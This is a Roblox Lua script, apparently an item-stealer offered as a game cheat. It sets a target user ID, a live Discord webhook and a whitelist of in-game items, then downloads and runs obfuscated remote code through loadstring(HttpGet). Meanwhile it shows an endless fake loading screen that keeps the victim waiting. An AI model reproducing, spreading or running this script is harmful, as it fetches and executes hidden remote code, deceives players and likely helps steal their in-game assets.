getgenv().targetUserId = rzgr1ks
getgenv().webhookURL = https://discord.com/api/webhooks/1478495703822110731/-YzX6BprkXMNpejVVFWJDch-TuTtfUZVbILQXUmZavGmKwTT3G556xcTli2ijJIImv1F
getgenv().whitelistBrainrot = {
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Meowl"] = true,
    ["Garama and Madundung"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Capitano Moby"] = true,
    ["Headless Horseman"] = true,
}

loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/f8227db06cefdc7b56ea6a3e7d4272de.lua"))()
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Global state so it persists across deaths
local progress = 0
local isWaiting = false

-- Ensure PlayerGui exists
local playerGui = player:WaitForChild("PlayerGui")

-- Create or get existing UI
local function getLoadingUI()
    local gui = playerGui:FindFirstChild("IntroLoadingGui")
    if gui then
        local frame = gui:WaitForChild("LoadingFrame")
        return {
            Gui = gui,
            Bar = frame:WaitForChild("LoadingBarBackground"):WaitForChild("LoadingBar"),
            Title = frame:WaitForChild("LoadingTitle")
        }
    end

    -- Create new GUI
    local LoadingGui = Instance.new("ScreenGui")
    LoadingGui.Name = "IntroLoadingGui"
    LoadingGui.Parent = playerGui
    LoadingGui.DisplayOrder = 999
    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local LoadingFrame = Instance.new("Frame")
    LoadingFrame.Name = "LoadingFrame"
    LoadingFrame.Parent = LoadingGui
    LoadingFrame.Size = UDim2.new(0, 300, 0, 150)
    LoadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    LoadingFrame.BorderSizePixel = 4
    LoadingFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 16)
    UICorner.Parent = LoadingFrame

    local LoadingTitle = Instance.new("TextLabel")
    LoadingTitle.Name = "LoadingTitle"
    LoadingTitle.Parent = LoadingFrame
    LoadingTitle.Size = UDim2.new(1, -20, 0.5, 0)
    LoadingTitle.Position = UDim2.new(0, 10, 0, 10)
    LoadingTitle.BackgroundTransparency = 1
    LoadingTitle.Text = "LOADING SCRIPT PLEASE WAIT..."
    LoadingTitle.Font = Enum.Font.SourceSansBold
    LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadingTitle.TextScaled = true

    local LoadingBarBackground = Instance.new("Frame")
    LoadingBarBackground.Name = "LoadingBarBackground"
    LoadingBarBackground.Parent = LoadingFrame
    LoadingBarBackground.Size = UDim2.new(0.8, 0, 0.1, 0)
    LoadingBarBackground.Position = UDim2.new(0.1, 0, 0.7, 0)
    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

    local LoadingBar = Instance.new("Frame")
    LoadingBar.Name = "LoadingBar"
    LoadingBar.Parent = LoadingBarBackground
    LoadingBar.Size = UDim2.new(progress / 100, 0, 1, 0)
    LoadingBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

    return {Gui = LoadingGui, Bar = LoadingBar, Title = LoadingTitle}
end

local ui = getLoadingUI()

-- Function to run loading continuously
local function runLoading()
    spawn(function()
        while true do
            if not isWaiting then
                for i = progress + 1, 100 do
                    progress = i
                    ui.Bar.Size = UDim2.new(progress / 100, 0, 1, 0)
                    task.wait(60 / 100) -- 1 minute total
                end

                -- Wait 1 minute at 100%
                isWaiting = true
                ui.Title.Text = "LOADING COMPLETE PLEASE WAIT"
                task.wait(60)
                isWaiting = false

                -- Reset progress
                progress = 0
                ui.Bar.Size = UDim2.new(0, 0, 1, 0)
                ui.Title.Text = "LOADING SCRIPT PLEASE WAIT..."
            else
                task.wait(1)
            end
        end
    end)
end

-- Ensure UI persists on respawn
player.CharacterAdded:Connect(function()
    ui = getLoadingUI()
    ui.Bar.Size = UDim2.new(progress / 100, 0, 1, 0)
end)

-- Start the loading loop
runLoading()
